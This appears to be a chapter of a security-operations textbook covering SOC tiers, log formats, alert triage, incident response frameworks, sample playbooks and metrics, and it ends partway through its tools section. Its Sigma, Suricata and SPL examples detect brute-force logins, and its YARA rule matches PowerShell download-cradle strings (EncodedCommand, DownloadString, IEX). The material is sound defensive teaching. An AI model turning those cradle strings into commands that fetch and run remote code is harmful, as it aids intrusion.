# Chapter 10 — SOC Operations & Incident Response

## Overview

This chapter explains how an organization **monitors, detects, and responds to information security incidents** — the "operational, hands-on" complement to the static defensive layer (firewalls, access controls, passwords). The goals of the chapter: understand the data flow (where logs originate, how they are normalized and analyzed), the human roles (who reads, who handles), and the operational sequence when an incident occurs. The foundational terminology is defined below before diving into the technical detail in later sections.

### SOC (Security Operations Center)

**Definition.** A SOC is a unit composed of **people + processes + technology**, operating continuously (typically 24/7), responsible for monitoring, detecting, analyzing, and responding to security events across the entire infrastructure.

**Problem it solves.** Systems generate billions of event logs per day, yet only a tiny fraction represent real attacks. The SOC is the organizational mechanism for **separating signal from noise** in a way that is systematic, repeatable, and measurable.

### Logs and log formats

**Definition.** A log is an **event record** that each server, network device, or application generates on its own (for example: the time, subject, action, and result of a login attempt). A log format is the structural convention for that record.

**Problem it solves.** Each platform uses its own format — Linux uses **Syslog**, Windows uses the **Event Log**, security appliances often use **CEF**. For consistent analysis, logs must be normalized to a common schema. Reading each field correctly is a foundational SOC operations skill.

### SOC tiers (Tier 1/2/3)

**Definition.** A SOC divides work by investigation depth, not by rank:
- **Tier 1** — the front line that receives alerts and quickly triages true positive vs. false positive.
- **Tier 2** — deep investigation, containment, timeline reconstruction, rule tuning.
- **Tier 3** — proactive threat hunting, in-depth forensics, malware analysis, handling of major incidents/APTs.

**Problem it solves.** Alerts arrive in high volume, but most are simple or false positives. Having expensive specialists handle simple work is wasteful and causes burnout. Tiering ensures easy work is handled quickly and cheaply, while hard work is routed to people with the right capability.

### Alert triage

**Definition.** Triage is the process of evaluating an alert: is it real or false (TP/FP), what category does it fall into, how severe is it, should it be handled in place or escalated. The term is borrowed from medicine, referring to **prioritizing what to handle first**.

**Problem it solves.** Not every alert can be treated the same. Standardized triage ensures important matters are handled first and that threats disguised as normal activity are not missed.

### Incident response lifecycle (NIST & SANS PICERL)

**Definition.** Two standard incident response frameworks:
- **NIST SP 800-61** — 4 phases: Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity.
- **SANS PICERL** — 6 steps: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned.

The two models are essentially equivalent; SANS breaks Containment/Eradication/Recovery into separate steps.

**Problem it solves.** During an incident, ad hoc actions (such as immediately powering off a machine) can destroy evidence and let the incident spread. A standard process imposes the correct sequence: contain first, preserve evidence, then eradicate and recover.

### Playbook / Runbook

**Definition.**
- **Playbook** — a high-level process for a class of incident (phases, roles, decision points).
- **Runbook** — the detailed operational steps (commands, queries) that execute part of a playbook.

**Problem it solves.** An emergency is not the time to improvise. A predefined script ensures fast, consistent handling with no missed steps, even for less experienced analysts.

### MTTD and MTTR

**Definition.**
- **MTTD** (Mean Time To Detect) — the average time from when an incident begins to when it is detected.
- **MTTR** (Mean Time To Respond/Recover) — the average time from detection to when handling/recovery is complete.

**Problem it solves.** These two metrics quantify defensive speed and the effectiveness of improvements. The longer an attacker persists in the network (dwell time), the greater the damage; reducing MTTD/MTTR directly reduces damage.

### Practical tools (Sigma, Suricata, YARA, Splunk, osquery, SOAR)

- **Sigma** — a generic detection rule description format (YAML) that translates automatically into the query language of each SIEM. Write once, use across many platforms.
- **SIEM** — a platform that centralizes logs, indexes them for fast querying, and generates alerts based on rules. It is where analysts work.
- **Suricata** — an IDS/IPS engine that analyzes packets by signature, alerting on or blocking malicious traffic.
- **YARA** — a tool that identifies malware by patterns (strings, bytes, regex) within files.
- **Splunk (SPL)** — a popular SIEM; SPL is its log query language.
- **osquery / Velociraptor** — query endpoint state using SQL-like syntax, supporting threat hunting.
- **TheHive / SOAR** — manage IR cases and **automate** repetitive steps (lookups, blocking, notifications), freeing humans to focus on the complex parts.

**Problem it solves.** Humans cannot manually process billions of logs or every individual packet. These tools extend detection and response capability at large scale.

### Threat Hunting & MITRE ATT&CK

**Definition.** **Threat hunting** is the proactive activity of searching for traces of an attacker that automated detection has not yet caught, starting from a **hypothesis** (for example: an attacker is performing lateral movement). **MITRE ATT&CK** is a knowledge base that systematically classifies attack techniques (Tactics × Techniques), with each technique assigned a Txxxx code.

**Problem it solves.** Sophisticated attackers know how to evade existing rules. Proactive hunting based on an understanding of TTPs helps detect what automated systems miss.

### Chain of Custody & Forensics

**Definition.** **Forensics** (digital investigation) is the process of collecting and analyzing digital evidence. **Chain of custody** is the record documenting who held the evidence, when, and what was done with it — ensuring integrity and traceability.

**Problem it solves.** Evidence that has been altered or whose origin is unclear loses its legal value. A core principle: volatile data (RAM) is lost when a machine is powered off, so it must be collected according to the **order of volatility** — the reason many playbooks call for isolating the network but keeping the machine running rather than shutting it down.

### Log Retention

**Definition.** A policy defining **how long logs are retained** and how they are stored. It is usually tiered into hot/warm/cold: recent logs are kept in a fast-access tier (high cost), while older logs are compressed and kept in a low-cost tier.

**Problem it solves.** An attacker may hide in a network for months before being detected; retaining logs for too short a period causes an investigation to lose track of the moment of intrusion. In addition, many legal regulations mandate a minimum retention period.

The following sections go deeper into the technical detail of each concept above.

> This chapter is a reference document for self-study and lookup. Each concept is presented along the axis: **WHAT IT IS → INTERNAL MECHANISM (down to the bit/byte/step/parameter) → REAL-WORLD EXAMPLE (commands, configuration, rules, output) → SECURITY NOTES**. Figures are cited to their source; where verification is needed, it is marked "[needs verification]".

---

## 10.1. SOC architecture overview and data flow

### 10.1.1. What a SOC is and why it exists

A **SOC (Security Operations Center)** is a unit (people + processes + technology) responsible for continuous monitoring (typically 24/7), detection, analysis, and response to security events across the organization's entire digital infrastructure. Why it exists: defense is fundamentally a problem of **early detection within a sea of noisy data**. A mid-sized enterprise can generate billions of event logs per day; only a very small portion of those are signs of a real attack. The SOC is the organizational mechanism for separating signal from noise in a way that is systematic, repeatable, and measurable.

### 10.1.2. End-to-end data flow in a SOC

To understand everything that follows, you need to know precisely where the data goes and how it is transformed:

```
[Log sources]          [Transport]           [Normalize/Store]        [Detection]        [People]
 Endpoint (EDR) ──┐
 Firewall/IDS  ───┤   syslog/UDP 514
 Web server    ───┼──> TCP 6514 (TLS) ──> Collector ──> Parser/Normalize ──> SIEM ──> Alert ──> Analyst
 Cloud (CT logs)──┤   Beats/Agent             (Logstash,    (ECS, CIM)       (rule,    (Tier 1/2/3)
 AD/Auth       ───┘   Kafka                    Vector)                        ML, corr)
```

**Explanation of each stage:**

| Stage | Role | Typical data format |
|---|---|---|
| Log source | Generates raw events | Windows Event (EVTX/XML), Syslog (RFC 5424), JSON, CEF, LEEF |
| Transport | Carries logs from sources to a central location | Syslog over UDP/TCP/TLS, Filebeat/Fluentd, Kafka topic |
| Normalization | Maps to a common schema for querying | ECS (Elastic Common Schema), Splunk CIM, OCSF |
| SIEM | Stores, indexes, runs correlation rules | Inverted index, time-series store |
| Detection | Generates alerts from rules/ML/correlation | Sigma rule, EQL, SPL, KQL |
| People | Triage, investigate, respond | Ticket, playbook, case |

**Why the layered design:** decoupling source — transport — storage — detection allows each component to be replaced independently (swap the SIEM without reconfiguring every endpoint), absorb load with buffers (Kafka absorbs bursts), and apply distinct security controls at each stage (transport encryption, access control over the log store).

---

## 10.2. Log formats at the byte/field level — the foundation you must know

SOC analysis begins with reading each log field correctly. Below are the core formats dissected down to the field level.

### 10.2.1. Syslog RFC 5424 — dissecting each field

RFC 5424 (2009) defines the modern syslog format, replacing RFC 3164 (the old BSD syslog). An RFC 5424 syslog message has the structure:

```
<PRI>VERSION SP TIMESTAMP SP HOSTNAME SP APP-NAME SP PROCID SP MSGID SP STRUCTURED-DATA SP MSG
```

A real-world example line:

```
<34>1 2026-06-19T08:21:09.003Z auth-srv-01 sshd 4821 ID47 [exampleSDID@32473 iut="3"] Failed password for invalid user admin from 203.0.113.45 port 51022 ssh2
```

Field-by-field breakdown:

| Field | Size | Meaning | Example |
|---|---|---|---|
| PRI | 3–5 characters, including `<` `>` | Priority = Facility×8 + Severity | `<34>` |
| VERSION | 1–2 characters (numeric) | Format version, always `1` for RFC 5424 | `1` |
| TIMESTAMP | up to 32 characters, RFC 3339 | Time the event was generated, with timezone | `2026-06-19T08:21:09.003Z` |
| HOSTNAME | ≤ 255 characters | Name/IP of the machine that generated the log | `auth-srv-01` |
| APP-NAME | ≤ 48 characters | Application name | `sshd` |
| PROCID | ≤ 128 characters | PID or process id | `4821` |
| MSGID | ≤ 32 characters | Message type | `ID47` |
| STRUCTURED-DATA | variable | Structured key=value pairs, `[SDID param="val"]` or `-` if empty | `[exampleSDID@32473 iut="3"]` |
| MSG | remainder | Free-form content (UTF-8, may begin with the BOM EF BB BF) | `Failed password ...` |

**Decoding the PRI field `<34>`** — this is a commonly misunderstood point:

PRI is an integer = `Facility * 8 + Severity`.

```
34 / 8 = 4  (integer part) -> Facility = 4  (security/authorization messages)
34 % 8 = 2                 -> Severity = 2  (Critical)
```

Severity table (RFC 5424 §6.2.1):

| Value | Name | Meaning |
|---|---|---|
| 0 | Emergency | System is unusable |
| 1 | Alert | Action must be taken immediately |
| 2 | Critical | Critical condition |
| 3 | Error | Error |
| 4 | Warning | Warning |
| 5 | Notice | Normal but significant condition |
| 6 | Informational | Informational |
| 7 | Debug | Debug |

Facility table (some important values): 0=kernel, 1=user, 2=mail, 3=daemon, 4=auth/security, 10=authpriv, 16–23=local0–local7.

**Why Facility and Severity are packed into one byte:** the design dates from an era of narrow bandwidth and small packets; a single integer lets routers/collectors filter quickly (for example, "only forward messages with severity ≤ 3") without parsing the entire message.

**Security note:** UDP 514 has no authentication, no encryption, and no guarantee of ordering or delivery. An attacker can **spoof** logs (forge the source) to create noise or erase traces by injecting fake logs. Production must use **syslog over TLS (RFC 5425, TCP 6514)** with mutual certificates.

### 10.2.2. Windows Event Log (EVTX) and the key security fields

Windows records events in the binary EVTX format but queries them in XML. Each event has the structure:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-...}"/>
    <EventID>4625</EventID>
    <Version>0</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8010000000000000</Keywords>
    <TimeCreated SystemTime="2026-06-19T08:21:09.003Z"/>
    <EventRecordID>184756</EventRecordID>
    <Channel>Security</Channel>
    <Computer>WIN-DC01</Computer>
    <Security/>
  </System>
  <EventData>
    <Data Name="TargetUserName">admin</Data>
    <Data Name="IpAddress">203.0.113.45</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="Status">0xC000006D</Data>
    <Data Name="SubStatus">0xC0000064</Data>
  </EventData>
</Event>
```

A table of security Event IDs you must memorize:

| Event ID | Meaning | Used to detect |
|---|---|---|
| 4624 | Successful logon | Access tracking, baseline |
| 4625 | Failed logon | Brute-force, password spray |
| 4634 / 4647 | Logoff | Session correlation |
| 4672 | Special privileges assigned to a logon | Admin/privilege detection |
| 4688 | New process creation (with cmdline if enabled) | Malicious execution detection |
| 4768 / 4769 | Kerberos TGT / Service ticket | Kerberoasting, Golden Ticket |
| 4719 | Audit policy change | Attacker disabling auditing |
| 1102 | Security log cleared | Anti-forensics |
| 7045 | New service installed | Persistence |

**The `LogonType` field (Event 4624/4625)** — very important for distinguishing the type of access:

| LogonType | Meaning |
|---|---|
| 2 | Interactive (logon at the machine) |
| 3 | Network (file share access, RDP over NLA) |
| 4 | Batch (scheduled task) |
| 5 | Service |
| 7 | Unlock (screen unlock) |
| 8 | NetworkCleartext (password sent in cleartext — suspicious) |
| 9 | NewCredentials (runas /netonly) |
| 10 | RemoteInteractive (RDP) |
| 11 | CachedInteractive (using cached credentials) |

**The `Status`/`SubStatus` fields (Event 4625)** — NTSTATUS error codes that indicate why the logon failed:

| Code | Meaning |
|---|---|
| 0xC0000064 | User does not exist |
| 0xC000006A | Wrong password |
| 0xC0000234 | Account is locked out |
| 0xC0000072 | Account is disabled |
| 0xC000006F | Logon outside permitted hours |
| 0xC0000071 | Password has expired |

**Key distinction:** many 4625 events with SubStatus `0xC0000064` (user does not exist) interleaved → a sign of **password spray / user enumeration**; many `0xC000006A` for the **same user** → **brute-force** of that specific account.

### 10.2.3. CEF (Common Event Format) — a popular SIEM format

CEF was defined by ArcSight; its header is delimited by the `|` character:

```
CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity|Extension
```

Example:

```
CEF:0|Security|Firewall|2.1|100|Blocked connection|7|src=203.0.113.45 dst=10.0.0.5 spt=51022 dpt=22 proto=TCP act=blocked
```

| Field | Meaning | Example |
|---|---|---|
| Version | CEF version | `0` |
| Device Vendor | Vendor | `Security` |
| Device Product | Product | `Firewall` |
| Device Version | Product version | `2.1` |
| Signature ID | Event type code | `100` |
| Name | Description | `Blocked connection` |
| Severity | 0–10 | `7` |
| Extension | key=value pairs (CEF dictionary) | `src=... dst=... spt=...` |

Standard Extension keys: `src` (source IP), `dst` (dest IP), `spt` (source port), `dpt` (dest port), `suser` (source user), `act` (action), `proto`. Standardized keys are the reason CEF is so widely supported by SIEMs — the parser knows in advance the meaning of each key.

---

## 10.3. SOC structure by tier — the exact responsibilities of each level

A SOC is organized in a **tiered** model to allocate work complexity and staffing cost sensibly. This is not a hierarchy of status but a division of work by investigation depth.

```
                       ┌──────────────────────────────────────────────┐
                       │              Feedback loop                    │
                       │   New detection rules, IOC/TTP, FP tuning     │
                       ▼                                               │
  SIEM ──alert──> ┌─────────┐  escalate   ┌─────────┐  escalate  ┌─────────┐
                  │ Tier 1  │ ───(case)──> │ Tier 2  │ ──(major)─>│ Tier 3  │
                  │ Triage  │             │ Investig.│           │ Hunt/RE  │
                  └────┬────┘             └────┬────┘            └────┬────┘
                       │ mostly FP/simple       │ investigation,      │ proactive hunting,
                       │ -> close in place      │ containment          │ deep forensics, APT
                       ▼                        ▼                      ▼
                  TP/FP ticket            Report + IOC          Detection + RCA
```

Note: alerts move up (escalate) when they exceed the capability/complexity of the current tier; knowledge (detection rules, IOCs, tuning) flows back down to automate what was investigated manually, reducing the load on lower tiers.

### 10.3.1. Tier 1 — Triage Analyst (Alert Handler)

**Responsibilities:**
- The front line that receives alerts from the SIEM.
- Performs initial **triage**: quickly verifying whether an alert is a true positive (TP) or a false positive (FP).
- Classifies by type (malware, phishing, brute-force, etc.) and by priority level.
- Closes well-justified FPs; **escalates** to Tier 2 if it exceeds their capability/complexity.
- KPIs: alert response time, percentage of alerts handled within SLA.

**Limits:** Tier 1 works according to predefined **playbooks/runbooks**; they do not perform deep, free-form system investigation. The goal is throughput and consistency.

### 10.3.2. Tier 2 — Incident Responder / Investigator

**Responsibilities:**
- Receives escalated cases from Tier 1.
- Investigates in depth: analyzes multi-source logs, builds timelines, determines scope and root cause.
- Performs initial containment, coordinates eradication/recovery.
- Performs intermediate-level forensics (memory, basic disk artifacts).
- Writes and tunes detection rules to reduce FPs for Tier 1.

### 10.3.3. Tier 3 — Threat Hunter / Forensics & Malware Expert

**Responsibilities:**
- Proactive **threat hunting**: forming hypotheses and searching for traces of attackers that alerts have NOT detected.
- In-depth forensics (memory forensics, malware reverse engineering).
- Handling major incidents and APTs.
- Developing new detections, threat intelligence, participating in purple team exercises.

### 10.3.4. Tier comparison

| Criterion | Tier 1 | Tier 2 | Tier 3 |
|---|---|---|---|
| Input | Raw alert | Escalated case | Hypothesis / major incident |
| Main activity | Triage, classification | Investigation, containment | Hunting, deep forensics, malware RE |
| Degree of autonomy | Follows playbook | Guided investigation | Self-directed |
| Typical tools | SIEM console, SOAR | SIEM query, EDR, sandbox | Volatility, IDA/Ghidra, YARA, threat intel |
| Output | TP/FP ticket, escalation | Investigation report, IOC | New detections, IOC/TTP, RCA |

**Why tiering:** alerts arrive in high volume but most are simple or false positives. Having expensive specialists (Tier 3) handle FPs is wasteful and causes burnout. Tiering ensures simple work is handled quickly and cheaply, while hard work is routed to people with the right capability.

---

## 10.4. Alert triage process — step by step

Triage is a core SOC operations skill. The standard process consists of 5 steps.

### Step 1 — Validation
Answer: is this alert real? Read the raw event behind the alert (do not trust the SIEM's summary), and check:
- Is the log source trustworthy? (a real asset, or a honeypot/test?)
- Does it match the baseline? (a known internal IP? a legitimate user?)
- Is it a scheduled/approved activity? (a periodic scan, a pentest?)

### Step 2 — Categorization
Assign an incident category according to the organization's taxonomy (usually mapped to NIST/VERIS or a MITRE ATT&CK tactic): for example `Credential Access`, `Malware`, `Phishing`, `Recon`.

### Step 3 — Prioritization
Compute the priority level as a function of **severity** × **confidence/fidelity** × **asset criticality**. A commonly used priority formula:

```
Priority = Severity (Impact) × Likelihood
```

An example mapping into a P1–P4 matrix:

| Impact \ Likelihood | High | Medium | Low |
|---|---|---|---|
| High (production server/DC) | P1 | P1 | P2 |
| Medium | P2 | P2 | P3 |
| Low (test machine) | P3 | P3 | P4 |

### Step 4 — Escalate or handle
- If within the scope of a playbook → handle per the playbook.
- If beyond scope / suspected major incident → escalate to Tier 2 with **full context** (raw logs, IOCs, steps already taken). Escalation without context is the number-one cause of slow investigations.

### Step 5 — Closure
- FP: clearly document the **reason** and the **evidence**; propose rule tuning so the alert does not recur.
- TP that has been handled: document the actions taken, IOCs, and lessons learned.

**Security note:** sloppy FP closure (not reading the raw log, "looks familiar") is a serious operational vulnerability — attackers deliberately create activity that "looks normal." Every closure must have traceable evidence.

---

## 10.5. Incident response lifecycle — NIST SP 800-61 and SANS PICERL

### 10.5.1. NIST SP 800-61 — 4 phases

NIST SP 800-61 Rev. 2 (Computer Security Incident Handling Guide) defines a 4-phase lifecycle. Note that the lifecycle is a **repeating cycle** (not linear) — Detection & Analysis and Containment/Eradication/Recovery may loop multiple times.

```
      ┌───────────────────────────────────────────────────────────────────────────┐
      │                                                                           │
      ▼                                                                           │
┌───────────────┐   ┌───────────────┐   ┌───────────────────────────┐   ┌───────────────────┐
│ 1.Preparation │──>│ 2.Detection & │──>│ 3.Containment, Eradication│──>│ 4.Post-Incident   │
│               │   │   Analysis    │   │   & Recovery              │   │   Activity        │
│               │   │               │   │                           │   │ (Lessons Learned) │
└───────────────┘   └───────┬───────┘   └─────────────┬─────────────┘   └─────────┬─────────┘
      ▲                  ▲  │                      ▲  │                           │
      │                  └──┘ (analysis loop)      └──┘ (handling loop)           │
      └───────────────────────────────────────────────────────────────────────────┘
```

#### Phase 1 — Preparation
**Input:** policies, budget, tools. **Output:** a ready response capability.
Activities: build the IR plan & playbooks; assemble a jump kit (forensic laptop, write-blocker, clean drives, cables); establish out-of-band communication channels (in case the main systems are compromised); training; tabletop exercises; ensure adequate logging/visibility. **This is the most important phase** — without preparation, the later phases descend into chaos.

#### Phase 2 — Detection & Analysis
**Input:** alerts, logs, reports. **Output:** confirmation of the incident, its scope, and its severity.
Activities: identify precursors (signs that something is about to happen) and indicators (signs that something is happening/has happened); analyze and correlate; determine scope; **document** every finding; **prioritize** (functional/information/recoverability impact); **notify** relevant parties.

#### Phase 3 — Containment, Eradication & Recovery
- **Containment:** prevent the spread. Divided into 2 levels:
  - *Short-term:* fast, possibly temporary actions — disconnect the infected machine from the network, block the C2 IP at the firewall. Goal: stop the damage NOW without destroying evidence.
  - *Long-term:* more stable solutions while preparing for eradication — temporary patches, placing the host in an isolation VLAN, applying ACLs.
- **Eradication:** remove the root cause entirely — remove malware, delete attacker-created accounts, close the exploited vulnerability, reset compromised credentials.
- **Recovery:** return systems to production safely — restore from clean backups, rebuild machines, apply enhanced monitoring to ensure the attacker does not return.

#### Phase 4 — Post-Incident Activity (Lessons Learned)
**Input:** the full incident record. **Output:** improvements.
Activities: hold a "lessons learned" meeting within a few days of closing the incident; answer: What happened and when? Where did the team do well/poorly? What information should we have had earlier? Which steps should we have done differently? What additional tools/processes are needed? Update playbooks, detections, and training.

### 10.5.2. SANS PICERL — 6 steps

SANS uses a 6-step model, easily remembered by the acronym **PICERL**:

| Step | Name | Corresponds to NIST |
|---|---|---|
| P | Preparation | Preparation |
| I | Identification | Detection & Analysis |
| C | Containment | Containment |
| E | Eradication | Eradication |
| R | Recovery | Recovery |
| L | Lessons Learned | Post-Incident Activity |

**Difference from NIST:** SANS separates Containment/Eradication/Recovery into 3 distinct steps (clearer operationally), whereas NIST combines them into a single phase (emphasizing the iterative nature). Essentially the two models are equivalent.

### 10.5.3. Containment vs. Eradication — the core distinction

| Criterion | Containment | Eradication |
|---|---|---|
| Goal | Prevent spread, stop damage immediately | Remove the root cause entirely |
| Nature | Temporary, reversible | Permanent |
| Example | Disconnect the infected host from the network | Format & rebuild the host, remove the backdoor |
| Evidence | Must be PRESERVED (not yet deleted) | After forensics has been collected |
| Common mistake | Powering off immediately → losing RAM (volatile) | Removing malware but missing persistence |

**Golden rule:** Containment first, collect evidence (forensics), then Eradication. Eradication that misses a backdoor/scheduled task → the attacker returns during Recovery.

---

## 10.6. Sample playbooks / runbooks

**Playbook** = the high-level process (the phases, who does what, what to decide). **Runbook** = the specific operational steps (commands, queries) to carry out part of a playbook. Below are 3 key playbooks.

### 10.6.1. Playbook — Brute-force / Password Spray (SSH/RDP)

```
TRIGGER: > 20 occurrences of 4625 (or sshd Failed password) from the same src within 5 minutes,
         OR 1 src trying > 10 different usernames (spray)

1. IDENTIFY
   - Query all failed logins from the src IP, 24h window.
   - Determine: is there any 4624 (success) AFTER the failure sequence? -> if YES: raise severity (already got in)
   - Collect: src IP, target username, LogonType, geo/ASN of the IP.

2. CONTAIN (short-term)
   - If no success yet: block the src IP at the firewall/WAF.
   - If an internal IP: isolate the source host (it may be compromised and used as a pivot).

3. CONTAIN (if already successful - Step 1 detected a 4624)
   - Disable the account that was successfully accessed.
   - Force a password reset; kill active sessions.
   - Switch to the "Compromised Account" playbook.

4. ERADICATE
   - Sweep for persistence on the host if the IP is internal.
   - Check for newly created unknown accounts (Event 4720), group changes (4728/4732).

5. RECOVER
   - Remove the block after confirming safety / or keep blocking the IOC.
   - Enable MFA, apply rate-limit / fail2ban.

6. LESSONS
   - Why did the account use a weak password? Is MFA in place? Tune the alert threshold.
```

### 10.6.2. Playbook — Phishing

```
TRIGGER: User reports a suspicious email / EDR alerts on an attachment.

1. IDENTIFY
   - Collect the original email (.eml/.msg) - DO NOT forward (it strips headers). Use "save as".
   - Analyze headers: Return-Path, Received chain, SPF/DKIM/DMARC results (Authentication-Results).
   - Extract IOCs: sender, reply-to, URL, attachment hash, domain.
   - Detonate the attachment/URL in a sandbox.
   - Query: how many other users RECEIVED this email? How many CLICKED/opened it?

2. CONTAIN
   - Quarantine/purge the email from every mailbox (e.g. Microsoft 365 Search & Purge).
   - Block the sender domain and URL at the mail gateway/proxy/DNS sinkhole.
   - Reset credentials if it is credential-harvesting and the user entered them.

3. ERADICATE
   - Remove the payload on endpoints where it executed (EDR).
   - Check for malicious mailbox rules (forwarding rules created by the attacker).

4. RECOVER / LESSONS
   - Notify users; awareness training; add IOCs to the blocklist.
```

### 10.6.3. Playbook — Ransomware

```
TRIGGER: Alert on mass file rename/encrypt, ransom note, EDR detection.

1. CONTAIN (HIGHEST PRIORITY - speed is decisive)
   - ISOLATE the infected host from the network NOW (unplug the cable/disable the switchport/EDR network-isolate).
   - DO NOT power off (preserve RAM for forensics; some variants keep the key in RAM).
   - Isolate backups from the network (ransomware targets backups).

2. IDENTIFY
   - Identify the variant (ransom note, extension, ID.Ransomware/no-more-ransom).
   - Patient zero & the intrusion vector (RDP brute? phishing? vulnerability?).
   - Scope: which machines are infected, which network shares are encrypted.

3. ERADICATE
   - Rebuild infected machines from a clean image (DO NOT attempt to "clean in place").
   - Close the initial vector, reset all credentials (assume the domain is compromised).

4. RECOVER
   - Restore from backups VERIFIED to be clean (check that the backup is not infected).
   - DO NOT rush to pay the ransom (no guarantee, may violate law/sanctions).

5. LESSONS / beyond the technical
   - Notify legal/authorities as required by regulation; communications; insurance.
```

**Note:** with ransomware, the priority order is reversed from usual — **Containment comes before Identification** because the encryption spreads in a matter of minutes.

---

## 10.7. Measurement metrics — MTTD, MTTR

### 10.7.1. Formulas

**MTTD (Mean Time To Detect):** the average time from when an incident begins to when it is detected.

```
MTTD = Σ (T_detect[i] − T_start[i]) / N
```

**MTTR (Mean Time To Respond/Recover/Remediate — must be defined clearly):** the average time from detection to when handling/recovery is complete.

```
MTTR = Σ (T_resolve[i] − T_detect[i]) / N
```

Commonly encountered variants (state clearly which one you are measuring):
- **MTTA** (Acknowledge): from alert to when an analyst takes it up.
- **MTTR** may mean Respond, Recover, or Remediate — the definitions differ and must be agreed upon internally.

Example calculation: 3 incidents with (detect − start) = 4h, 12h, 2h → MTTD = (4+12+2)/3 = 6h.

### 10.7.2. How to improve

| Metric | How to improve |
|---|---|
| MTTD | Increase visibility (cover log gaps), add high-quality detection rules, proactive threat hunting, reduce FPs so analysts can focus |
| MTTA | Route alerts correctly, reduce alert fatigue (group/dedupe), 24/7 coverage |
| MTTR | Automation (SOAR playbooks), clear runbooks, ready-to-use action authority (pre-approved containment), drills |

**Security note:** blindly optimizing MTTD/MTTR easily leads to "closing cases quickly" → missing things. Metrics must be paired with the TP/FP ratio and a review of closure quality.

---

## 10.8. Practical tools — runnable examples

### 10.8.1. Sigma — writing SIEM-independent detection rules

**What it is:** Sigma is a YAML format that describes a detection rule generically, after which `sigma`/`sigmac` (pySigma) converts it into the query language of a specific SIEM (Splunk SPL, Elastic KQL/EQL, QRadar AQL, etc.).

**[DEMO]** Rule example illustrating the mechanism — detecting SSH/Windows brute-force (illustrative only; tune before production use):

```yaml
title: Multiple Failed Logons Followed by Success (Possible Brute-Force)
id: 7a8b9c10-1111-2222-3333-444455556666
status: experimental
description: Detects >=20 failed logons from a single source then a success
logsource:
  product: windows
  service: security
detection:
  failed:
    EventID: 4625
  success:
    EventID: 4624
  timeframe: 5m
  condition: failed | count() by IpAddress >= 20 and success
fields:
  - IpAddress
  - TargetUserName
  - LogonType
falsepositives:
  - Misconfigured service account
  - Vulnerability scanner
level: high
tags:
  - attack.credential_access
  - attack.t1110            # Brute Force
```

Parameter explanation: `logsource` identifies the source so pySigma can choose the correct field mapping; `detection` contains the "search identifiers" (`failed`, `success`); `condition` matches the title exactly — grouping by `IpAddress`, it requires **many failed logons (≥ 20) FOLLOWED BY at least one success from the same source** (`failed | count() by IpAddress >= 20 and success`), not merely a count of failures; `timeframe` is the correlation window; `tags` map to MITRE ATT&CK (T1110 = Brute Force, see [Chapter 15](#sec-15)).

**Convert to Splunk:**

```bash
sigma convert -t splunk -p splunk_windows brute_force.yml
```

**[DEMO]** Sample output (abbreviated, reflecting the "fail then success" condition):

```
(EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failed, count(eval(EventCode=4624)) as success by IpAddress
| where failed >= 20 AND success > 0
```

**Security note:** always declare `falsepositives` so Tier 1 understands the context; mapping MITRE `tags` helps measure coverage (which cells of the ATT&CK matrix already have a rule).

### 10.8.2. Suricata — IDS/IPS, dissecting a rule

**What it is:** Suricata is an IDS/IPS engine that analyzes packets by signature.

**Rule structure:**

```
action proto src_ip src_port direction dst_ip dst_port (options)
```

**[DEMO]** Example illustration — detecting SSH brute-force using a threshold (the threshold must be tuned to the baseline before production use):

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH brute force attempt"; \
  flow:to_server,established; \
  threshold:type threshold, track by_src, count 5, seconds 60; \
  classtype:attempted-admin; sid:1000001; rev:1;)
```

Dissecting each part:

| Component | Meaning | Example |
|---|---|---|
| action | Action when matched | `alert` (alert only), `drop` (IPS) |
| proto | Protocol | `tcp` |
| src_ip / src_port | Source | `$EXTERNAL_NET any` |
| direction | Direction | `->` (one-way) |
| dst_ip / dst_port | Destination | `$HOME_NET 22` |
| msg | Description in the alert | `"SSH brute force attempt"` |
| flow | Connection state | `to_server,established` |
| threshold | Frequency threshold | 5 times / 60s / per src |
| classtype | Classification | `attempted-admin` |
| sid | Signature ID (≥1000000 for user-defined rules) | `1000001` |
| rev | Rule revision | `1` |

**Test offline against a pcap file:**

```bash
suricata -r capture.pcap -S local.rules -l ./output/
cat ./output/fast.log
```

Sample `fast.log` output:

```
06/19/2026-08:21:09.003456 [**] [1:1000001:1] SSH brute force attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 203.0.113.45:51022 -> 10.0.0.5:22
```

**Security note:** `alert` only detects; to block you need IPS mode (`drop`) and Suricata must be inline (NFQUEUE/AF_PACKET). A `threshold` that is too sensitive causes FPs, too high misses attacks — it must be tuned to the baseline.

### 10.8.3. YARA — classifying files/malware by pattern

**What it is:** YARA describes patterns (strings, bytes, regex) to identify malware families.

```yara
rule Suspicious_PowerShell_Downloader
{
    meta:
        author = "soc-team"
        description = "Encoded PowerShell download cradle"
        date = "2026-06-19"
    strings:
        $a = "powershell" nocase
        $b = "-EncodedCommand" nocase
        $c = "DownloadString" nocase
        $hex = { 49 45 58 20 28 4E 65 77 }   // "IEX (New"
    condition:
        $a and ($b or $c or $hex)
}
```

Explanation: `strings` defines the patterns (`nocase` is case-insensitive; `$hex` is an exact byte sequence — `49 45 58` = ASCII "IEX"); `condition` is the combining logic.

**Real-world scan:**

```bash
yara -r downloader.yar /home/user/Downloads/
# Output: Suspicious_PowerShell_Downloader /home/user/Downloads/invoice.ps1
```

**Security note:** patterns that are too generic (just `$a` "powershell") cause mass FPs; combine multiple conditions and a distinctive byte-pattern.

### 10.8.4. Splunk SPL — investigation queries

**[DEMO]** Example detecting brute-force-then-success (the scenario in section 10.10):

```spl
index=wineventlog (EventCode=4625 OR EventCode=4624)
| transaction IpAddress maxspan=10m
| where eventcount > 20 AND searchmatch("EventCode=4624")
| table _time IpAddress TargetUserName eventcount
```

Parameter explanation: `transaction` groups events with the same `IpAddress` within `maxspan=10m`; `eventcount` is the number of events in the transaction; the filter condition selects transactions that contain both many failures and at least one success.

